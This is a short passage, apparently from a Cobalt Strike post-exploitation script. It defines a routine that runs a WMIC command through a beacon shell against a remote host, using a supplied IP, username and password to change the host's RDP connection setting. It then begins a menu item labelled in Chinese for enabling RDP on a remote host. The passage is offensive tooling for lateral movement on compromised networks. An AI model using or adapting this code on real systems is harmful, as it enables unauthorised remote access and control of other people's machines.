sub rdp_roc1{
	bshell($bid, "wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] PATH win32_terminalservicesetting WHERE (__Class!=\"\") CALL SetAllowTSConnections 0");
} 

				item "开启远程主机RDP(高版本)" {
				$bid = $1['@'];
